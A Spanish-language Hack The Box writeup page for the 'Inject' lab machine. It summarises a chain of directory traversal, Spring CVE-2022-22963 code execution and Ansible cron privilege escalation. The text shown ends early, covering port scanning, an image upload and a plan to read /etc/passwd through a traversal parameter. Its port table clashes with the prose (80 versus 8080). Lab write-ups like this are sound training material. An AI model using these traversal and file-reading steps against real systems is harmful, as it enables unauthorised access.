<!DOCTYPE html><html lang="en" class="scroll-smooth" data-astro-cid-37fxchfa> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/ico" href="/favicon.ico"><meta name="generator" content="Astro v4.0.8"><!-- Canonical URL --><link rel="canonical" href="https://blog-template-gray.vercel.app/post/inject/"><!-- Primary Meta Tags --><title>Inject - HTB Writeup - Fullaw4ke Blog</title><!-- ViewTransitions  --><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><!-- SEO --><meta name="title" content="Inject - HTB Writeup - Fullaw4ke Blog"><meta name="description" content="Descubrimos LFI que nos revela version vulnerable de Spring Framework CVE-2022-22963, abuso de ansible para Priv Esc."><meta name="author" content="Fullaw4ke"><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://blog-template-gray.vercel.app/post/inject/"><meta property="og:title" content="Inject - HTB Writeup"><meta property="og:description" content="Descubrimos LFI que nos revela version vulnerable de Spring Framework CVE-2022-22963, abuso de ansible para Priv Esc."><meta property="og:image" content="https://blog-template-gray.vercel.app/_astro/image.VSrpVXDi.png"><meta property="article:author" content="Fullaw4ke"><meta property="article:published_time" content="2022-07-02T04:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog-template-gray.vercel.app/post/inject/"><meta property="twitter:title" content="Inject - HTB Writeup"><meta property="twitter:description" content="Descubrimos LFI que nos revela version vulnerable de Spring Framework CVE-2022-22963, abuso de ansible para Priv Esc."><meta property="twitter:image" content="https://blog-template-gray.vercel.app/_astro/image.VSrpVXDi.png"><!-- RSS auto-discovery --><link rel="alternate" type="application/rss+xml" title="Fullaw4ke Blog" href="/rss.xml"><link as="font" crossorigin rel="preload" href="/fonts/Manrope-Bold.woff2" type="font/woff2"><style>@font-face {font-weight: 200;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraLight.woff2)}</style><style>@font-face {font-weight: 300;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Light.woff2)}</style><style>@font-face {font-weight: 400;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Regular.woff2)}</style><style>@font-face {font-weight: 500;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Medium.woff2)}</style><style>@font-face {font-weight: 600;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-SemiBold.woff2)}</style><style>@font-face {font-weight: 700;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Bold.woff2)}</style><style>@font-face {font-weight: 800;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraBold.woff2)}</style><style>@font-face { font-family: _font_fallback_1728655860475; size-adjust: 103.76%; src: local('Arial'); ascent-override: 102.74%; descent-override: 28.91%; line-gap-override: 0.00%; }</style><script>
	function getTheme() {
		const storedTheme = typeof localStorage !== 'undefined' && localStorage.getItem('theme')

		return (
			storedTheme || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'light' : 'dark')
		)
	}

	function setTheme(newTheme) {
		const html = document.documentElement
		const isDark = newTheme === 'dark'

		html.classList.toggle('dark', isDark)
		html.classList.toggle('light', !isDark)

		localStorage.setItem('theme', newTheme)
	}

	// set initial theme
	setTheme(getTheme())
	document.addEventListener('astro:after-swap', () => setTheme(getTheme()))

	document.addEventListener('theme-change', (e) => {
		setTheme(e.detail.theme)
	})
</script><script>
	if (!('animations' in localStorage)) {
		localStorage.setItem('animations', 'true')
	} else {
		localStorage.setItem('animations', 'false')
	}
</script><link rel="stylesheet" href="/_astro/_page_.oLAkEadO.css" />
<link rel="stylesheet" href="/_astro/_slug_.m5WJ7WE5.css" /><script type="module" src="/_astro/hoisted.cZ5bdfWX.js"></script></head> <body class="bg-white text-stone-950 dark:bg-[#0a0910] dark:text-white" data-astro-cid-37fxchfa> <main class="px-5 sm:mx-auto sm:max-w-2xl sm:px-8 lg:px-0 antialiased md:max-w-6xl grid gap-12 mt-4 overflow-hidden md:overflow-visible" data-astro-cid-37fxchfa> <header class="relative flex items-center h-12 font-semibold"> <a class="text-lg mr-auto" href="/">Home</a> <div id="astro-header-drawer" class="shadow rounded-l-lg md:bg-transparent dark:md:bg-transparent bg-white dark:bg-[#0a0910] md:shadow-none md:rounded-none md:border-none md:h-auto md:static absolute transition-transform duration-300 ease-in translate-x-96 md:translate-x-0 top-12 -right-5 pl-4 pt-6 pb-4 md:p-0 h-[200px] w-[200px] z-50"> <nav class="flex h-full flex-col justify-between gap-12 text-left md:flex-row md:w-full md:gap-5"> <div class="flex flex-col gap-4 md:flex-row md:border-r-2 border-black pr-4 dark:border-white"> <a href="/tags" class="text-opacity-60 flex items-center gap-1 text-2xl md:text-base" rel="noopener noreferrer ">  <svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M7.859 6h-2.834a2.025 2.025 0 0 0 -2.025 2.025v2.834c0 .537 .213 1.052 .593 1.432l6.116 6.116a2.025 2.025 0 0 0 2.864 0l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-6.117 -6.116a2.025 2.025 0 0 0 -1.431 -.593z"></path> <path d="M17.573 18.407l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-7.117 -7.116"></path> <path d="M6 9h-.01"></path> </svg> Tags
 </a> </div> <div class="flex justify-center items-center md:justify-end gap-3 md:p-0"> <a href="https://github.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Github">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path> </svg> </span>  </a><a href="https://x.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Twitter">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c0 -.249 1.51 -2.772 1.818 -4.013z"></path> </svg> </span>  </a> </div> </nav> </div> <div class="flex items-center gap-3 md:pl-3" data-astro-transition-persist="navbar"> <div> <site-search id="search" class="ms-auto"> <button data-open-modal disabled class="flex items-center justify-center rounded-md gap-1"> <svg aria-label="search" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"> <path stroke="none" d="M0 0h24v24H0z"></path> <path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6"></path> </svg> <!-- <span class='md:hidden text-2xl'> Search</span> --> </button> <dialog aria-label="search" class="h-full max-h-full w-full max-w-full border border-zinc-400 bg-white dark:bg-[#0a0910ec] shadow backdrop:backdrop-blur sm:mx-auto sm:mb-auto sm:mt-16 sm:h-max sm:max-h-[calc(100%-8rem)] sm:min-h-[15rem] sm:w-5/6 sm:max-w-[48rem] sm:rounded-md opacity-0"> <div class="dialog-frame flex flex-col gap-4 p-6 pt-12 sm:pt-6"> <button data-close-modal class="ms-auto cursor-pointer rounded-full bg-black text-white px-4 py-2 dark:bg-white dark:text-black">Close</button> <div class="search-container dark:text-white"> <div id="pagefind__search"></div> </div> </div> </dialog> </site-search>   </div>  <theme-toggle class="relative h-6 w-6"> <button id="toggle-theme" class="group" aria-label="Toggle Theme"> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-pressed:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun-high" width="24" height="24" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z"></path> <path d="M6.343 17.657l-1.414 1.414"></path> <path d="M6.343 6.343l-1.414 -1.414"></path> <path d="M17.657 6.343l1.414 -1.414"></path> <path d="M17.657 17.657l1.414 1.414"></path> <path d="M4 12h-2"></path> <path d="M12 4v-2"></path> <path d="M20 12h2"></path> <path d="M12 20v2"></path> </svg> </span> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-[pressed=false]:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path> </svg> </span> </button> </theme-toggle> <script>
	const button = document.getElementById('toggle-theme')

	function setButtonPresssed() {
		const bodyThemeIsDark = document.documentElement.classList.contains('dark')
		button.setAttribute('aria-pressed', String(bodyThemeIsDark))
	}
	setButtonPresssed()
</script> <button id="astro-header-drawer-button" type="button" class="md:ml-6 md:hidden"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M4 6l16 0"></path> <path d="M4 12l16 0"></path> <path d="M4 18l16 0"></path> </svg> <span class="sr-only">Show Menu</span> </button> </div> </header>   <article class="min-w-full md:py-4 sm:max-w-none md:max-w-none"> <header class="mb-3 flex flex-col justify-center items-center gap-6"> <div class="flex flex-col gap-2"> <div class="flex items-center justify-center gap-x-1"> <p class="text-center text-sm text-opacity-50">
Published <time class="text-sm font-bold text-opacity-60" datetime="2022-07-02T04:00:00.000Z"> Jul 2, 2022 </time> </p> <p class="text-center text-sm text-opacity-50 font-bold">
- 8 min read </p> </div> <h1 class="text-center text-4xl md:text-6xl md:pb-2.5 font-semibold"> Inject - HTB Writeup </h1> </div> <div class="flex flex-wrap justify-center items-center gap-2 gap-y-4 md:gap-5"> <a href="/tags/easy" aria-label="Easy"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Easy </span> </a> </div> </header> <img src="/_astro/image.VSrpVXDi_ZLQ1dz.jpg" loading="eager" class="rounded-md w-full max-h-[300px]  md:max-h-[500px] my-8 object-cover" alt="img of Inject - HTB Writeup" width="1000" height="500" decoding="async"> <hr> <div>  <div class="grid grid-cols-1 md:grid-cols-[20%_auto] gap-10 mt-8"> <!-- aside  --> <aside class="md:flex flex-col gap-8 hidden"> <div class="flex flex-col gap-2"> <span class="mb-1 font-bold text-2xl">Share</span> <ul class="flex gap-3 text-black dark:text-white"> <li> <a href="https://twitter.com/intent/tweet?text=Share this post https://blog-template-gray.vercel.app/post/inject/" aria-label="Share on Twitter"><!--?xml version="1.0" ?--><svg height="32px" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;" version="1.1" viewBox="0 0 512 512" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M448,512l-384,0c-35.328,0 -64,-28.672 -64,-64l0,-384c0,-35.328 28.672,-64 64,-64l384,0c35.328,0 64,28.672 64,64l0,384c0,35.328 -28.672,64 -64,64Z" id="Dark_Blue" style="fill:#1da1f2;fill-rule:nonzero;"></path><path d="M196.608,386.048c120.704,0 186.752,-100.096 186.752,-186.752c0,-2.816 0,-5.632 -0.128,-8.448c12.8,-9.216 23.936,-20.864 32.768,-34.048c-11.776,5.248 -24.448,8.704 -37.76,10.368c13.568,-8.064 23.936,-20.992 28.928,-36.352c-12.672,7.552 -26.752,12.928 -41.728,15.872c-12.032,-12.8 -29.056,-20.736 -47.872,-20.736c-36.224,0 -65.664,29.44 -65.664,65.664c0,5.12 0.64,10.112 1.664,14.976c-54.528,-2.688 -102.912,-28.928 -135.296,-68.608c-5.632,9.728 -8.832,20.992 -8.832,33.024c0,22.784 11.648,42.88 29.184,54.656c-10.752,-0.384 -20.864,-3.328 -29.696,-8.192l0,0.896c0,31.744 22.656,58.368 52.608,64.384c-5.504,1.536 -11.264,2.304 -17.28,2.304c-4.224,0 -8.32,-0.384 -12.288,-1.152c8.32,26.112 32.64,45.056 61.312,45.568c-22.528,17.664 -50.816,28.16 -81.536,28.16c-5.248,0 -10.496,-0.256 -15.616,-0.896c28.928,18.432 63.488,29.312 100.48,29.312" id="Logo__x2014__FIXED" style="fill:#fff;fill-rule:nonzero;"></path></g></svg></a> </li> <li> <a href="https://www.linkedin.com/shareArticle?mini=true&#38;url=https://blog-template-gray.vercel.app/post/inject/" aria-label="Share on LinkedIn"> <svg enable-background="new 0 0 32 32" height="32px" id="Layer_1" version="1.0" viewBox="0 0 32 32" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M32,30c0,1.104-0.896,2-2,2H2c-1.104,0-2-0.896-2-2V2c0-1.104,0.896-2,2-2h28c1.104,0,2,0.896,2,2V30z" fill="#007BB5"></path><g><rect fill="#FFFFFF" height="14" width="4" x="7" y="11"></rect><path d="M20.499,11c-2.791,0-3.271,1.018-3.499,2v-2h-4v14h4v-8c0-1.297,0.703-2,2-2c1.266,0,2,0.688,2,2v8h4v-7    C25,14,24.479,11,20.499,11z" fill="#FFFFFF"></path><circle cx="9" cy="8" fill="#FFFFFF" r="2"></circle></g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg></a> </li> </ul> </div> <div class="sticky top-24 self-start hidden md:block transition-all duration-200"> <nav class="max-w-xs dark:text-black"> <p class="font-bold mb-3 text-2xl dark:text-white">Index</p> <ul class="[text-wrap:balance] flex flex-col gap-1"> <li class="flex flex-col"> <a href="#initial-recon" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Initial Recon </a>  </li><li class="flex flex-col"> <a href="#web" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Web </a>  </li><li class="flex flex-col"> <a href="#file-disclosure" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> File Disclosure </a>  </li><li class="flex flex-col"> <a href="#remote-code-execution" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Remote Code Execution </a>  </li><li class="flex flex-col"> <a href="#privilege-escalation" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Privilege Escalation </a>  </li><li class="flex flex-col"> <a href="#frank" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Frank </a>  </li><li class="flex flex-col"> <a href="#phil" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Phil </a>  </li><li class="flex flex-col"> <a href="#ansible" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Ansible </a>  </li><li class="flex flex-col"> <a href="#alternative-solution-bonus" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Alternative Solution (Bonus) </a>  </li> </ul> </nav> </div> </aside> <!-- post --> <article class="max-w-full w-full"> <div class="prose prose-lg md:prose-xl dark:prose-invert mb-12 min-w-full"> <p>Inject es una máquina Linux fácil creada por rajHere en Hack The Box que consiste en explotar un bug de Directory Traversal para localizar y leer archivos locales como frank. Usamos esta vulnerabilidad para enumerar las versiones de software involucradas en el servidor web, donde encontramos una instalación desactualizada de Spring Framework que es vulnerable a un bug crítico rastreado como CVE-2022-22963. Este fallo se utiliza entonces para obtener la ejecución de código como frank, y encontrar credenciales para phil en el directorio home de frank. El usuario phil tiene permiso para escribir playbooks de Ansible en un determinado directorio que es utilizado por root en trabajos CRON programados. Con un playbook especial, somos capaces de ejecutar código como root y obtener la bandera del sistema</p>
<h1 id="initial-recon">Initial Recon</h1>
<p>Vamos a configurar nuestro entorno y ejecutar un escaneo de puertos TCP con esta envoltura nmap personalizada.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@Kali (bash)</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">rhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.11.204</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Target IP address</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">lhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.14.4</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Your VPN IP address</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> rhost=</span><span style="color:#B07D48;--shiki-dark:#BABED8">$rhost</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .env</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> lhost=</span><span style="color:#B07D48;--shiki-dark:#BABED8">$lhost</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .env</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">.</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ./.env</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> ctfscan</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $rhost</span></span></code></pre> 
<p>The open ports reported in the scan include:</p>























<table><thead><tr><th>Port</th><th>Service</th><th>Product</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>ssh</td><td>OpenSSH</td><td>8.9p1</td></tr><tr><td>80</td><td>HTTP</td><td>Nagios NSCA</td><td></td></tr></tbody></table>
<h1 id="web">Web</h1>
<p>Comenzaremos explorando el servidor HTTP en el puerto 8080 ya que los servicios web suelen ser vulnerables. También vamos a enrutar nuestras peticiones a través de nuestro proxy local BurpSuite o simplemente utilizar el navegador incorporado de BurpSuite</p>
<p><img src="/_astro/image-1._hxjC5UM_SefaG.webp" alt="alt text" width="1146" height="706" loading="lazy" decoding="async"></p>
<p>La página de inicio presenta algunas características, incluida la posibilidad de subir archivos. Vamos a echar un vistazo a esa página, ya que la carga de archivos es un terreno resbaladizo en lo que respecta a la seguridad.</p>
<p><img src="/_astro/image-2.puAOhLyt_TozWL.webp" alt="alt text" width="1227" height="339" loading="lazy" decoding="async"></p>
<p>Intentaremos subir un archivo en nuestra sesión de navegador mientras capturamos la petición con BurpSuite.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">POST</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /upload</span><span style="color:#B56959;--shiki-dark:#C3E88D"> HTTP/1.1</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Host:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.204:8080</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Content-Length:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 220</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Content-Type:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> multipart/form-data</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#B07D48;--shiki-dark:#BABED8"> boundary</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B56959;--shiki-dark:#C3E88D">----WebKitFormBoundaryAPgIHu4nfmqDyyE2</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">User-Agent:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> BurpSuite</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Accept:</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> *</span><span style="color:#B56959;--shiki-dark:#C3E88D">/</span><span style="color:#A65E2B;--shiki-dark:#BABED8">*</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">------WebKitFormBoundaryAPgIHu4nfmqDyyE2</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Content-Disposition:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> form-data</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#B07D48;--shiki-dark:#BABED8"> name</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">file</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#B07D48;--shiki-dark:#BABED8"> filename</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">demo.txt</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Content-Type:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> text/plain</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">This</span><span style="color:#B56959;--shiki-dark:#C3E88D"> is</span><span style="color:#B56959;--shiki-dark:#C3E88D"> a</span><span style="color:#B56959;--shiki-dark:#C3E88D"> standard</span><span style="color:#B56959;--shiki-dark:#C3E88D"> UTF-8</span><span style="color:#B56959;--shiki-dark:#C3E88D"> text</span><span style="color:#B56959;--shiki-dark:#C3E88D"> file...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">------WebKitFormBoundaryAPgIHu4nfmqDyyE2--</span></span></code></pre> 
<p><img src="/_astro/image-3.jffDw9Cz_1mywVs.webp" alt="alt text" width="1209" height="349" loading="lazy" decoding="async"></p>
<p>La respuesta indica que el formulario acepta exclusivamente archivos de imagen, así que intentaremos subir una imagen.</p>
<p><img src="/_astro/image-4.UbUd3imO_Z1jbFSo.webp" alt="alt text" width="1221" height="325" loading="lazy" decoding="async"></p>
<p>La carga se ha realizado correctamente y podemos ver la imagen dinámicamente en el punto final /show_image.</p>
<p><img src="/_astro/image-5.D6ZNYQIX_Z1BcSit.webp" alt="alt text" width="1514" height="703" loading="lazy" decoding="async"></p>
<h2 id="file-disclosure">File Disclosure</h2>
<p>Parece que el archivo de imagen se carga dinámicamente desde el sistema de archivos utilizando el parámetro img. Veamos si podemos leer algún archivo fuera de nuestro directorio de trabajo como /etc/passwd.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span 